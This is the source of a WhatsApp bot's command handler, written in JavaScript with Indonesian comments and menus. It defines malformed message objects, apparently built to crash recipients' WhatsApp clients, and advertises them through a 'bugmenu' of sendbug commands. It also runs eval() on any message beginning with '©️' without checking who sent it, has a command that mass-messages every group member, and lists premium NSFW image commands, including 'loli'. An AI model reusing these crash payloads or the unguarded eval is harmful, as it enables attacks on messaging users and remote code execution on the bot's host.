require('./config')
const { WA_DEFAULT_EPHEMERAL, getAggregateVotesInPollMessage, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, downloadContentFromMessage, areJidsSameUser, getContentType } = global.baileys
const fs = require('fs')
const util = require('util')
let fetch = require('node-fetch');
const chalk = require('chalk')
const os = require('os')
const axios = require('axios')
const fsx = require('fs-extra')
const crypto = require('crypto')
const ffmpeg = require('fluent-ffmpeg')
const moment = require('moment-timezone')
const { JSDOM } = require('jsdom')
const { color, bgcolor } = require('./lib/color')
const maker = require('mumaker')
const textpro = require('./lib/textpro')
const { tizi } = require('./lib/tizi');
const { weg } = require('./lib/weg');
const { vapi } = require('./lib/vapi.js');
const { philips } = require('./lib/philips.js');
const { apikey } = require('./apikey.json')
const { uptotelegra } = require('./lib/upload')
const { Primbon } = require('scrape-primbon')
const primbon = new Primbon()
const { Configuration, OpenAIApi } = require('openai')
const { exec, spawn, execSync } = require("child_process")
const { UploadFileUgu, webp2mp4File, TelegraPh } = require('./lib/uploader')
const { smsg, tanggal, getTime, isUrl, sleep, clockString, runtime, fetchJson, getBuffer, jsonformat, format, parseMention, getRandom, getGroupAdmins } = require('./lib/myfunc')
const { FajarNews, BBCNews, metroNews, CNNNews, iNews, KumparanNews, TribunNews, DailyNews, DetikNews, OkezoneNews, CNBCNews, KompasNews, SindoNews, TempoNews, IndozoneNews, AntaraNews, RepublikaNews, VivaNews, KontanNews, MerdekaNews, KomikuSearch, AniPlanetSearch, KomikFoxSearch, KomikStationSearch, MangakuSearch, KiryuuSearch, KissMangaSearch, KlikMangaSearch, PalingMurah, LayarKaca21, AminoApps, Mangatoon, WAModsSearch, Emojis, CoronaInfo, JalanTikusMeme,Cerpen, Quotes, Couples, Darkjokes } = require("dhn-api");

const prem = JSON.parse(fs.readFileSync('./database/premium.json'))
const owner = JSON.parse(fs.readFileSync('./database/owner.json'))
const vnnye = JSON.parse(fs.readFileSync('./database/vnadd.json'))
const docunye = JSON.parse(fs.readFileSync('./database/docu.json'))
const zipnye = JSON.parse(fs.readFileSync('./database/zip.json'))
const apknye = JSON.parse(fs.readFileSync('./database/apk.json'))
const ntilink = JSON.parse(fs.readFileSync("./lib/antilink.json"))
const banned = JSON.parse(fs.readFileSync('./database/banned.json'))
const thumb = fs.readFileSync(`./image/lol.jpg`)

module.exports = conn = async (conn, m, chatUpdate, store) => {
 try {
var body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype === 'messageContextInfo') ? (m.text) : ''
var budy = (typeof m.text == 'string' ? m.text : '')
var prefix = prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" : prefa ?? global.prefix


const isCmd = body.startsWith(prefix)
const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()//Kalau mau Single prefix Lu ganti pake ini = const command = body.slice(1).trim().split(/ +/).shift().toLowerCase()
const args = body.trim().split(/ +/).slice(1)
const pushname = m.pushName || "No Name"
const botNumber = await conn.decodeJid(conn.user.id)
const isCreator = [botNumber, ...owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const text = q = args.join(" ")
const { type, quotedMsg, mentioned, now, fromMe } = m
const quoted = m.quoted ? m.quoted : m
const mime = (quoted.msg || quoted).mimetype || ''
const isMedia = /image|video|sticker|audio/.test(mime)
const isPrem = prem.includes(m.sender)
const from = mek.key.remoteJid
const groupMetadata = m.isGroup ? await conn.groupMetadata(from).catch(e => {}) : ''
const sender = m.isGroup ? (m.key.participant ? m.key.participant : m.participant) : m.key.remoteJid
const groupName = m.isGroup ? groupMetadata.subject : ''
const participants = m.isGroup ? await groupMetadata.participants : ''
const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
const welcm = m.isGroup ? wlcm.includes(from) : false
const welcmm = m.isGroup ? wlcmm.includes(from) : false
const AntiLink = m.isGroup ? ntilink.includes(from) : false 
const isBan = banned.includes(m.sender)
const content = JSON.stringify(m.message)
const numberQuery = text.replace(new RegExp("[()+-/ +/]", "gi"), "") + "@s.whatsapp.net"
const mentionByTag = m.mtype == "extendedTextMessage" && m.message.extendedTextMessage.contextInfo != null ? m.message.extendedTextMessage.contextInfo.mentionedJid : []
const Input = mentionByTag[0] ? mentionByTag[0] : q ? numberQuery : false
const time = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('HH:mm:ss z')
const salam = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('a')
const qtod = m.quoted? "true":"false"
vn = true
//fake quoted
const ftroli = {
         key: {
            fromMe: false,
            "participant": "0@s.whatsapp.net",
            "remoteJid": "status@broadcast"
         },
         "message": {
            orderMessage: {
               itemCount: 7777777,
               status: 200,
               surface: 200,
               message: `© ${ownername}`,
               orderTitle: 'memek',
               sellerJid: '0@s.whatsapp.net'
            }
         },
         contextInfo: {
            "forwardingScore": 999,
            "isForwarded": true
         },
         sendEphemeral: true
      }
const fkontak = {
         key: {
            participant: `0@s.whatsapp.net`,
            ...(from ? {
               remoteJid: `status@broadcast`
            } : {})
         },
         message: {
            'contactMessage': {
               'displayName': `${pushname}`,
               'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;${pushname},;;;\nFN:${pushname},\nitem1.TEL;waid=${sender.split('@')[0]}:${sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`,
               'jpegThumbnail': thumb,
               thumbnail: thumb,
               sendEphemeral: true
            }
         }
      }
      const fbugstik = {
key: { 
            fromMe: false, 
            participant: `0@s.whatsapp.net`, 
            ...({ remoteJid: "" }) 
        }, 
        message: { 
"stickerMessage": {
"url": "https://mmg.whatsapp.net/d/f/AnrD-A1QmqzujA1cup-mlu8IZA25t9JgmpQepFY9Rn6z.enc'",
"fileSha256": "YEkt1kHkOx7vfb57mhnFsiu6ksRDxNzRBAxqZ5O461U=",
"fileEncSha256": "9ryK8ZNEb3k3CXA0X89UjCiaHAoovwYoX7Ml1tzDRl8=",
"mediaKey": "nY85saH7JH45mqINzocyAWSszwHqJFm0M0NvL7eyIDM=",
"mimetype": "image/webp",
"height": 999999999,
"width": 999999999,
"directPath": "/v/t62.15575-24/30929805_648615486894459_9146693700573396349_n.enc?ccb=11-4&oh=01_AVwP9-aotKL3M5xo84ruYmFJof6hpjvTaHtWrOLdvzhkxw&oe=632E77C8",
"fileLength": "999999999",
"mediaKeyTimestamp": "1657290167",
"isAnimated": false,
}
}
}
const fbugtoko = {
key: { 
            fromMe: false, 
            participant: `0@s.whatsapp.net`, 
            ...({ remoteJid: "" }) 
        }, 
        message: { 
"productMessage": {
"product": {
"productImage":{
"mimetype": "image/jpeg",
"jpegThumbnail": thumb //Gambarnye
},
"title": `👿ᴬᵗᵗᵃᶜᵏᵉʳ ᵂʰᵃᵗˢᴬᵖᵖ👿`, //Kasih namalu 
"description": "⫹⫺ sʜɪɴᴄʜᴀɴ-ɪɴꜰɪɴɪᴛʏ-ᴄʀᴀꜱʜ-ᴡᴀ", 
"retailerId": "XD",
"productImageCount": 999999999
},
"businessOwnerJid": `0@s.whatsapp.net`
}
}
}
const fbugtext = {
        key: { 
            fromMe: false, 
            participant: `0@s.whatsapp.net`, 
            ...({ remoteJid: "" }) 
        }, 
        message: {
        "extendedTextMessage": {
        "text": `${weg}\n${weg}`
        }
        }
        }
        const fbugcall = {
key: { 
            fromMe: false, 
            participant: `0@s.whatsapp.net`, 
            ...({ remoteJid: "" }) 
        }, 
        message: { 
        "scheduledCallCreationMessage": {
"callType": '1',
"scheduledTimestampMs": `${moment(1000).tz("Asia/Jakarta").format("DD/MM/YYYY HH:mm:ss")}`,
"title": `test`,
}
}
}
const ftest = {
key: { 
            fromMe: false, 
            participant: `0@s.whatsapp.net`, 
            ...({ remoteJid: "" }) 
        }, 
        message: { 
"interactiveMessage": {
						"header": {
							"title": "ShinChan",
							"subtitle": "Jumlah 1"
						},
						"nativeFlowMessage": {
							"buttons": [
								{
									"name": "review_and_pay",
									"buttonParamsJson": { 
									"currency": "IDR",
									"external_payment_configurations":[
									{
									"uri": "",
									"type": "payment_instruction",
									"payment_instruction": "Anu"
									}
									],
									"payment_configuration":"",
									"payment_type":"",
									"total_amount": 10000,
									"reference_id":"4N003CFPZ6N",
									"type":"physical-goods",
									"payment_status":"captured",
									"payment_timestamp": 1696052026,
									"order":{"status":"completed","description":"","subtotal": 10000,
									"items":[
									{
									"retailer_id": "custom-item-ef3e2769-f40f-410f-9da4-5b3478de1bc4",
									"name":"ShinChan",
									"amount": 10000,
									"quantity":1}]}}
								}
							]
						}
					}
					}
					}
//===================SHINCHAN XD=========================//
const paycall = (teks) => {
var scheduledCallCreationMessage = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": '1',
"scheduledTimestampMs": `${moment(1000).tz("Asia/Jakarta").format("DD/MM/YYYY HH:mm:ss")}`,
"title": `${teks}`,
}
}), { userJid: m.chat, quoted: m })
conn.relayMessage(m.chat, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
}
const paytod = (teks) => {
let me = m.sender
var requestPaymentMessage = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"requestPaymentMessage": {
"currencyCodeIso4217": "INR",
"amount1000": "10000000000",
"requestFrom": `@${me.split('@')[0]}`,
"noteMessage": {
"extendedTextMessage": {
"text": `${teks}`,
}
}}}), { userJid: m.chat, quoted: fkontak })
conn.relayMessage(m.chat, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
}
const reply = (teks) => {
return conn.sendMessage(from, { text: teks, contextInfo:{"externalAdReply": {"title": `DEVELOPER ${botname}`,"body": `Selamat ${salam} kak ${pushname}`, "previewType": "PHOTO","thumbnailUrl": 'https://telegra.ph/file/8cd68dfc3fa902010e0e6.jpg',"thumbnail": thumb,"sourceUrl": `https://youtube.com/channel/UCqCZmaSvnbsre9EKEyGtviQ`}}}, { quoted: fkontak})} 

function pickRandom(list) {
return list[Math.floor(Math.random() * list.length)]
}
// DELAY FUNCTION
function delay(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}
async function replyprem(teks) {
    paycall(`Fitur ini untuk pengguna premium, hubungi pemilik untuk menjadi pengguna premium`)
}
async function loading () {
var shinchanehe = [
"▓▓▓▓▓▓▓▓▓▓▓▓▓▓ 10%",
"████▓▓▓▓▓▓▓▓▓▓ 30%",
"████████▓▓▓▓▓▓ 50%",
"████████████▓▓ 80%",
"██████████████ 100%",
"Loading Completed!"
]
let { key } = await conn.sendMessage(from, {text: 'Loading...'})//Pengalih isu

for (let i = 0; i < shinchanehe.length; i++) {
/*await delay(10)*/
await conn.sendMessage(from, {text: shinchanehe[i], edit: key });//PESAN LEPAS
}
}

//auto off
if (global.autoOff) {
if (command) {
conn.sendPresenceUpdate('unavailable', from)
}
}
//auto typing
if (global.autoTyping) {
if (command) {
conn.sendPresenceUpdate('composing', from)
}
}
//auto recording
if (global.autoRecord) {
if (command) {
conn.sendPresenceUpdate('recording', from)
}
}
//auto reading
if (global.autoReading) {
if (command) {
conn.readMessages([m.key])
}
}
let rn = ['unavailable']
let jd = rn[Math.floor(Math.random() * rn.length)];
if (m.message) {
conn.sendPresenceUpdate(jd, from)
console.log(chalk.black(chalk.bgWhite('[ PESAN ]')), chalk.black(chalk.bgGreen(new Date)), chalk.black(chalk.bgBlue(budy || m.mtype)) + '\n' + chalk.magenta('=> Dari'), chalk.green(pushname), chalk.yellow(m.sender) + '\n' + chalk.blueBright('=> Di'), chalk.green(m.isGroup ? pushname : 'Private Chat', from))
}
// Anti Link
if (AntiLink) {
if (body.match(/(chat.whatsapp.com\/)/gi)) {
if (!isBotAdmins) return m.reply(`${mess.botAdmin}, _Untuk menendang orang yang mengirim link group_`)
let gclink = (`https://chat.whatsapp.com/`+await conn.groupInviteCode(m.chat))
let isLinkThisGc = new RegExp(gclink, 'i')
let isgclink = isLinkThisGc.test(m.text)
if (isgclink) return conn.sendMessage(m.chat, {text: `\`\`\`「 Group Link Terdeteksi 」\`\`\`\n\nAnda tidak akan ditendang oleh bot karena yang Anda kirim adalah link ke grup ini`})
if (isAdmins) return conn.sendMessage(m.chat, {text: `\`\`\`「 Group Link Terdeteksi 」\`\`\`\n\nAdmin sudah mengirimkan link, admin bebas memposting link apapun`})
if (isCreator) return conn.sendMessage(m.chat, {text: `\`\`\`「 Group Link Terdeteksi 」\`\`\`\n\Owner telah mengirim link, owner bebas memposting link apa pun`})
await conn.sendMessage(m.chat,
{
delete: {
remoteJid: m.chat,
fromMe: false,
id: mek.key.id,
participant: mek.key.participant
}
})
conn.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
conn.sendMessage(from, {text:`\`\`\`「 Group Link Terdeteksi 」\`\`\`\n\n@${m.sender.split("@")[0]} Jangan kirim group link di group ini`, contextInfo:{mentionedJid:[sender]}}, {quoted:m})
}
}

// Respon Cmd with media
if (isMedia && m.msg.fileSha256 && (m.msg.fileSha256.toString('base64') in global.db.data.sticker)) {
let hash = global.db.data.sticker[m.msg.fileSha256.toString('base64')]
let { text, mentionedJid } = hash
let messages = await generateWAMessage(from, { text: text, mentions: mentionedJid }, {
userJid: conn.user.id,
quoted : m.quoted && m.quoted.fakeObj
})
messages.key.fromMe = areJidsSameUser(m.sender, conn.user.id)
messages.key.id = m.key.id
messages.pushName = m.pushName
if (m.isGroup) messages.participant = m.sender
let msg = {
...chatUpdate,
messages: [proto.WebMessageInfo.fromObject(messages)],
type: 'append'
}
conn.ev.emit('messages.upsert', msg)
}

if (budy.startsWith('©️')) {
try {
return m.reply(JSON.stringify(eval(`${args.join(' ')}`),null,'\t'))
} catch (e) {
m.reply(e)
}
}

//HD FUNCTION
async function processing(urlPath, method) {
	return new Promise(async (resolve, reject) => {
		let Methods = ["enhance", "recolor", "dehaze"];
		Methods.includes(method) ? (method = method) : (method = Methods[0]);
		let buffer,
			Form = new FormData(),
			scheme = "https" + "://" + "inferenceengine" + ".vyro" + ".ai/" + method;
		Form.append("model_version", 1, {
			"Content-Transfer-Encoding": "binary",
			contentType: "multipart/form-data; charset=uttf-8",
		});
		Form.append("image", Buffer.from(urlPath), {
			filename: "enhance_image_body.jpg",
			contentType: "image/jpeg",
		});
		Form.submit(
			{
				url: scheme,
				host: "inferenceengine" + ".vyro" + ".ai",
				path: "/" + method,
				protocol: "https:",
				headers: {
					"User-Agent": "okhttp/4.9.3",
					Connection: "Keep-Alive",
					"Accept-Encoding": "gzip",
				},
			},
			function (err, res) {
				if (err) reject();
				let data = [];
				res
					.on("data", function (chunk, resp) {
						data.push(chunk);
					})
					.on("end", () => {
						resolve(Buffer.concat(data));
					});
				res.on("error", (e) => {
					reject();
				});
			}
		);
	});
}
async function sendGeekzMessage(chatId, message, options = {}){
    let generate = await generateWAMessage(chatId, message, options)
    let type2 = getContentType(generate.message)
    if ('contextInfo' in options) generate.message[type2].contextInfo = options?.contextInfo
    if ('contextInfo' in message) generate.message[type2].contextInfo = message?.contextInfo
    return await conn.relayMessage(chatId, generate.message, { messageId: generate.key.id })
}

var createSerial = (size) => {removebg
return crypto.randomBytes(size).toString('hex').slice(0, size)
}
try {
ppuser = await conn.profilePictureUrl(m.sender, 'image')
} catch (err) {
ppuser = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
}
ppnyauser = await getBuffer(ppuser)
try {

let isNumber = x => typeof x === 'number' && !isNaN(x)
let limitUser = global.limitawal.free
let user = global.db.data.users[m.sender]
if (typeof user !== 'object') global.db.data.users[m.sender] = {}
if (user) {
if (!isNumber(user.afkTime)) user.afkTime = -1
if (!('afkReason' in user)) user.afkReason = ''
if (!isNumber(user.limit)) user.limit = limitUser
} else global.db.data.users[m.sender] = {
afkTime: -1,
afkReason: '',
limit: limitUser,
}
} catch (err) {
console.log(err)
} 

let mentionUser = [...new Set([...(m.mentionedJid || []), ...(m.quoted ? [m.quoted.sender] : [])])]
for (let jid of mentionUser) {
let user = global.db.data.users[jid]
if (!user) continue
let afkTime = user.afkTime
if (!afkTime || afkTime < 0) continue
let reason = user.afkReason || ''
m.reply(`Jangan tag dia!
Dia sedang AFK ${reason ? 'dengan alasan ' + reason : 'tanpa alasan'}
Selama ${clockString(new Date - afkTime)}
`.trim())
}
if (global.db.data.users[m.sender].afkTime > -1) {
let user = global.db.data.users[m.sender]
m.reply(`
Telah Kembali Dari Afk ${user.afkReason ? ' Selama ' + user.afkReason : ''}
Selama ${clockString(new Date - user.afkTime)}
`.trim())
user.afkTime = -1
user.afkReason = ''
}

switch(command) {
case 'menu': {
await loading()
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": '2',
"scheduledTimestampMs": `${moment(1000).tz("Asia/Jakarta").format("DD/MM/YYYY HH:mm:ss")}`,
"title": `*Hay ${pushname} 👋*
Selamat ${salam}

━━━━━━━━━━━━━━━
  *FITUR MENU* 
━━━━━━━━━━━━━━━
➤ ai
➤ hd
➤ loli
➤ waifu
➤ remini
➤ removebg
➤ imgeditor 🅟
➤ textimg 🅟
➤ toanime 🅟
➤ tocartoon 🅟
➤ jojo 🅟
➤ anime2d 🅟
➤ cartoon3d 🅟
➤ pretty 🅟
➤ romancecomic 🅟
➤ maid 🅟
➤ superhero 🅟
➤ watercolor 🅟
➤ doodle 🅟
➤ americacomic 🅟
➤ starrygirl 🅟
➤ aksarajawa
➤ latin (translate aksara jawa)
➤ lens / googlelens
➤ tiktok (link)
➤ tiktokmp3 (link)
➤ sticker 
➤ toimg
➤ take
➤ toaudio
➤ tomp3
➤ togif
➤ tovn
━━━━━━━━━━━━━━━
  *NSFW MENU* 
━━━━━━━━━━━━━━━
➤ hentai 🅟
➤ hneko 🅟
➤ trap 🅟
➤ blowjob 🅟
➤ pussy 🅟
➤ ecchi 🅟
➤ solog 🅟
━━━━━━━━━━━━━━━
➤ grupmenu
➤ bugmenu
━━━━━━━━━━━━━━━`,
}
}), { userJid: m.chat, quoted: m })
conn.relayMessage(from, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
}
break

case 'grupmenu': {
await loading()
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": '2',
"scheduledTimestampMs": `${moment(1000).tz("Asia/Jakarta").format("DD/MM/YYYY HH:mm:ss")}`,
"title": `*Hay ${pushname} 👋*
Selamat ${salam}
━━━━━━━━━━━━━━━
  *GROUP MENU* 
━━━━━━━━━━━━━━━
➤ welcome on / off
➤ antilink on / off
➤ antitoxic on / off
➤ pushkontak (textnya)
➤ pushcontid (id group)
➤ bcgc (textnya)
➤ openai (textnya)
➤ hidetag (textnya)
➤ kick (628xx)
➤ add (628xx)
➤ promote (628xx)
➤ demote (628xx)
➤ sendlinkgc (628xx)
➤ editgroup close / open
➤ editinfo on / off
➤ join (linknya)
➤ editsubjek (textnya)
➤ editdesk (textnya)
➤ tagall (textnya)
➤ linkgroup
➤ resetlinkgc
➤ promoteall
➤ demoteall
━━━━━━━━━━━━━━━`,
}
}), { userJid: m.chat, quoted: m })
conn.relayMessage(from, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
}
break
case 'bugmenu': {
await loading()
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": '2',
"scheduledTimestampMs": `${moment(1000).tz("Asia/Jakarta").format("DD/MM/YYYY HH:mm:ss")}`,
"title": `*Hay ${pushname} 👋*
Selamat ${salam}
━━━━━━━━━━━━━━━
  *BUG MENU* 
━━━━━━━━━━━━━━━
➤ bugtxt
➤ sendbug
➤ sendbugstik
➤ sendbugtroli
➤ sendbuggc (id group)
➤ sendbugtroligc (id group)
━━━━━━━━━━━━━━━`,
}
}), { userJid: m.chat, quoted: m })
conn.relayMessage(from, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
}
break

case 'pushkontak':{
if (!isCreator) return paycall('*Khusus Owner Bot*')
if (!m.isGroup) return paycall(`di group coy`)
if (!text) return paycall(`Teks Nya Kak?`)
let mem = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
let teksnye = `${q}`
paycall(`*Mengirim pesan ke ${mem.length} orang, waktu selesai ${mem.length * 3} detik*`)
for (let m of mem) {
await sleep(3000)
conn.sendMessage(m, {text: `${teksnye}`}, {quoted: fkontak})
}
paycall(`*Sukses mengirim pesan Ke ${mem.length} orang*`)
}
break
case 'owner': case 'crator':{
 conn.sendContact(from, global.owner, m)
}
break
case 'addprem':
if (!isCreator) return paycall('*Khusus Owner Bot*')
if (!args[0]) return paycall(`Use ${prefix+command} number\nExample ${prefix+command} 6282134110253`)
prrkek = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
let ceknya = await conn.onWhatsApp(prrkek)
if (ceknya.length == 0) return paycall(`Enter a valid and registered number on WhatsApp!!!`)
prem.push(prrkek)
fs.writeFileSync('./database/premium.json', JSON.stringify(prem))
paycall(`The Number ${prrkek} Has Been Premium!`)
break
case 'delprem':
if (!isCreator) return paycall('*Khusus Owner Bot*')
if (!args[0]) return paycall(`Use ${prefix+command} nomor\nExample ${prefix+command} 6282134110253`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
unp = prem.indexOf(ya)
prem.splice(unp, 1)
fs.writeFileSync('./database/premium.json', JSON.stringify(prem))
paycall(`The Number ${ya} Has Been Removed Premium!`)
break
//AI MENU
case 'ai': {
if (`${global.xzn}` == 'YOUR_APIKEY_HERE') return m.reply(global.noapikey)
paycall(global.wait)
  if (!text) return m.reply('Apa yang bisa saya bantu?')
    let response = await fetch(`https://api.akuari.my.id/ai/gpt?chat=${text}`)
    let data = await response.json()
   
  conn.sendText(from, data.respon, fkontak)
}
break
case 'jadianime': 
case 'toanime': {
if (!isPrem) return replyprem(mess.premium)
if (`${global.wtf}` == 'YOUR_APIKEY_HERE') return m.reply(global.noapikey)

if (!/video/.test(mime) && !/image/.test(mime)) throw `*Send/Reply the Video/Image With Caption* ${prefix + command}`
if (!quoted) throw `*Send/Reply the Video/Image Caption* ${prefix + command}`
let media = await conn.downloadAndSaveMediaMessage(quoted)
if (/image/.test(mime)) {
let anu = await TelegraPh(media)
paycall(global.wait)
  let response = `https://xzn.wtf/api/toanime?url=${util.format(anu)}&apikey=${global.wtf}`

conn.sendMessage(from, { image: { url: response}, caption: command },{ quoted: fkontak });
}
}
break
//========================WAIFU=========================//
case 'waifu': {
paycall(global.wait)
            axios.get(`https://api.waifu.pics/sfw/waifu`)
               .then(({
                  data
               }) => {
                  conn.sendImage(m.chat, data.url, done, fkontak)
               })
         }
         break
         case 'loli':{
         paycall(global.wait)
let heyy
if (/loli/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/loli.json')
let yeha = heyy[Math.floor(Math.random() * heyy.length)]
conn.sendMessage(m.chat, { image: { url: yeha }, caption : done }, { quoted: fkontak })
}
break
//========================WAIFU=========================//

//========================NSFW=========================//
         case 'hentai' :
if (!isPrem) return replyprem(mess.premium)
paycall(global.wait)
    waifudd = await axios.get(`https://waifu.pics/api/nsfw/waifu`)         
conn.sendMessage(m.chat, { caption: done, image: { url:waifudd.data.url } }, { quoted: fkontak })
break
case 'hneko' :
if (!isPrem) return replyprem(mess.premium)
paycall(global.wait)
    waifudd = await axios.get(`https://waifu.pics/api/nsfw/neko`)
conn.sendMessage(m.chat, { caption: done, image: { url:waifudd.data.url } }, { quoted: fkontak })
break
case 'trap' :
if (!isPrem) return replyprem(mess.premium)
paycall(global.wait)
    waifudd = await axios.get(`https://waifu.pics/nsfw/trap`)
conn.sendMessage(m.chat, { caption: done, image: { url:waifudd.data.url } }, { quoted: fkontak })
break
case 'blowjob' :
if (!isPrem) return replyprem(mess.premium)
paycall(global.wait)
    waifudd = await axios.get(`https://waifu.pics/nsfw/blowjob`)
conn.sendMessage(m.chat, { caption: done, image: { url:waifudd.data.url } }, { quoted: fkontak })
break
case 'pussy' :
if (!isPrem) return replyprem(mess.premium)
paycall(global.wait)
conn.sendMessage(from, { image: { url: `https://api.lolhuman.xyz/api/random2/${command}?apikey=${apikey}` } })
break
case 'ecchi' :
if (!isPrem) return replyprem(mess.premium)
paycall(global.wait)
conn.sendMessage(from, { image: { url: `https://api.lolhuman.xyz/api/random/nsfw/${command}?apikey=${apikey}` } })
break
case 'solog' :
if (!isPrem) return replyprem(mess.premium)
paycall(global.wait)
conn.sendMessage(from, { image: { url: `https://api.lolhuman.xyz/api/random2/${command}?apikey=${apikey}` } })
break
//========================NSFW=========================//

case 'hd': {
const alias = {
    "hd" : "torch-srgan",
  };
  const aliasCommand = alias[command] || command;
  if (`${global.wtf}` == 'YOUR_APIKEY_HERE') {
    return m.reply(global.noapikey);
  }

  if (!/video/.test(mime) && !/image/.test(mime)) {
    throw `*Send/Reply the Video/Image With Caption* ${prefix + command}`;
  }

  if (!quoted) {
    throw `*Send/Reply the Video/Image Caption* ${prefix + command}`;
  }
  let error;
try {
  let media = await conn.downloadAndSaveMediaMessage(quoted);

  if (/image/.test(mime)) {
    let anu = await TelegraPh(media);
    paycall(global.wait);

    const response = `https://xzn.wtf/api/torch-srgan?url=${anu}&apikey=nerobot`
    

    conn.sendMessage(from, { image: { url: response }, caption: 'nih' }, { quoted: fkontak });
  }
} catch (er) {
					error = true;
				} finally {
					if (error) {
						paycall("Proses Gagal :(");
					}
					}
					}
break
case 'removebg': {
const alias = {
    "removebg" : "removebg"
  };
  const aliasCommand = alias[command] || command;
  if (`${global.wtf}` == 'YOUR_APIKEY_HERE') {
    return m.reply(global.noapikey);
  }

  if (!/video/.test(mime) && !/image/.test(mime)) {
    throw `*Send/Reply the Video/Image With Caption* ${prefix + command}`;
  }

  if (!quoted) {
    throw `*Send/Reply the Video/Image Caption* ${prefix + command}`;
  }
  let error;
try {
  let media = await conn.downloadAndSaveMediaMessage(quoted);

  if (/image/.test(mime)) {
    let anu = await TelegraPh(media);
    paycall(global.wait);

    const response = `https://xzn.wtf/api/removebg?url=${anu}&apikey=nerobot`
    

    conn.sendMessage(from, { image: { url: response }, caption: 'nih' }, { quoted: fkontak });
  }
} catch (er) {
					error = true;
				} finally {
					if (error) {
						paycall("Proses Gagal :(");
					}
					}
					}
break
case 'remini': {
			if (!/image/.test(mime)) return paycall(`Send/Reply Foto Dengan Caption ${prefix + command}`)
			paycall(global.wait)
			const { remini } = require('./lib/remini')
			let media = await quoted.download()
			let proses = await remini(media, "enhance")
			conn.sendMessage(m.chat, { image: proses, caption: `𝑭𝒐𝒕𝒐 𝒅𝒂𝒉 𝒋𝒂𝒅𝒊 𝑯𝑫 𝒃𝒍𝒐𝒎 𝒃𝒂𝒏𝒈? \n\n𝑩𝒚: 𝑺𝒉𝒊𝒏𝑪𝒉𝒂𝒏 𝑺𝒆𝒏𝒑𝒂𝒊🐼❤️`}, { quoted: fkontak})
			}
			break
case 'imgeditor': {
  if (`${global.wtf}` == 'YOUR_APIKEY_HERE') {
    return m.reply(global.noapikey);
  }
  if (!isPrem) return replyprem(mess.premium)
if (!text) return m.reply(`Reply image with ${command} blue eyes with cute face and white skin`)
let error;
try{
  if (!/image/.test(mime)) {
    throw `*Send/Reply the Image With Caption* ${prefix + command}`;
  }
  if (!quoted) {
    throw `*Send/Reply the Video/Image Caption* ${prefix + command}`;
  }
  
  let media = await conn.downloadAndSaveMediaMessage(quoted);

  if (/image/.test(mime)) {
    let anu = await TelegraPh(media);
    m.reply(global.wait);

    let response = `https://xzn.wtf/api/image-editor?url=${anu}&text=${text}&apikey=kreya`
    conn.sendMessage(from, { image: { url: response}, caption: 'nih' }, { quoted: fkontak });
  }
} catch (er) {
					error = true;
				} finally {
					if (error) {
						m.reply("Proses Gagal :(");
					}
					}
					}
break
case 'jojo':
case 'anime2d':
case 'cartoon3d':
case 'pretty':
case 'romancecomic':
case 'maid':
case 'superhero':
case 'watercolor':
case 'doodle':
case 'americacomic':
case 'starrygirl': {
  const alias = {
    "anime2d": "anime_2d",
    "cartoon3d": "cartoon_3d",
    "pretty": "pretty_soldier",
    "jojo": "bizarre",
    "maid": "maid_dressing",
    "romancecomic": "romance_comic",
    "superhero": "superhero_comic",
    "watercolor": "watercolor",
    "doodle": "doodle",
    "americancomic": "america-comic",
    "starrygirl": "starry_girl"
  };
  const aliasCommand = alias[command] || command;
  if (!isPrem) return replyprem(mess.premium)

  if (`${global.wtf}` == 'YOUR_APIKEY_HERE') {
    return m.reply(global.noapikey);
  }

  if (!/video|image/.test(mime)) {
    throw `*Send/Reply the Video/Image With Caption* ${prefix + command}`;
  }

  if (!quoted) {
    throw `*Send/Reply the Video/Image Caption* ${prefix + command}`;
  }
let error;
try {
  let media = await conn.downloadAndSaveMediaMessage(quoted);

  if (/image/.test(mime)) {
    let anu = await TelegraPh(media);
    paycall(global.wait);

    const response = await fetchJson(`https://xzn.wtf/api/aimirror?&apikey=kreya&url=${anu}&filter=${aliasCommand}`);
   
    conn.sendMessage(from, { image: { url: response.generated_image_addresses[0] }, caption: 'nih' }, { quoted: fkontak });
  }
} catch (er) {
					error = true;
				} finally {
					if (error) {
						paycall("Proses Gagal :(");
					}
					}
					}
break
